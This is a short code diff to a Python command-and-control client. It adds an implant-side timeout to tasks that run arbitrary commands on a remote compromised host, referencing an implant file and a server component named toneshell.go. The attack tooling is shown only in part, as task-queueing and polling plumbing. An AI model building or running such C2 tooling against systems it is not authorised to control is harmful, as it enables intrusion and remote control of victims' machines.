@@ -110,7 +110,11 @@ class C2Client:
 
     def cmd_exec(self, command: str):
         task_num = self._next_task_num()
-        task     = {"id": TS_EXEC, "taskNum": task_num, "args": command}
+        # timeout: implant-side wait limit (exec.cpp wait_limit_ms); server reads
+        # taskData["timeout"] (toneshell.go) - without this key the server sends
+        # DEFAULT_TASK_TIMEOUT (120 s) and long T-SQL batches die with 0x60004.
+        task     = {"id": TS_EXEC, "taskNum": task_num, "args": command,
+                    "timeout": self._timeout_s}
         info     = self._post_task(task)
         task_guid = info[TASK_GUID_KEY]
         print(f"[*] task {task_guid} queued (taskNum={task_num}), waiting ...")
@@ -125,7 +129,11 @@ class C2Client:
         if self.debug:
             print(f"[DBG] EXEC  -> {command}")
         task_num = self._next_task_num()
-        task     = {"id": TS_EXEC, "taskNum": task_num, "args": command}
+        # implant-side timeout = the larger of the operator default and this
+        # call's poll timeout, so the wait limit never kills a batch the poll
+        # is still waiting on.
+        task     = {"id": TS_EXEC, "taskNum": task_num, "args": command,
+                    "timeout": max(self._timeout_s, timeout_s)}
         info     = self._post_task(task)
         output   = self._poll_output(info[TASK_GUID_KEY], timeout_s=timeout_s)
         if self.debug and output:
